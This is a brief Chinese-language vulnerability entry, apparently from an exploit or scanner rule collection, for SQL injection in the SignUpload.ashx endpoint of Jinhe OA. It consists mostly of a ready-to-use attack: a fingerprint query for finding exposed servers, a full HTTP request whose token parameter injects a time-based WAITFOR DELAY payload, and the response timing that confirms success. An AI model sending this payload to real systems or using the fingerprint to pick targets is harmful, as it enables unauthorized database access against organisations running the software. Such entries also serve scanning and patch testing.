# 金和OAC6SignUpload.ashxSQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%205%27+--%20and%201=1_123_123&filename=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s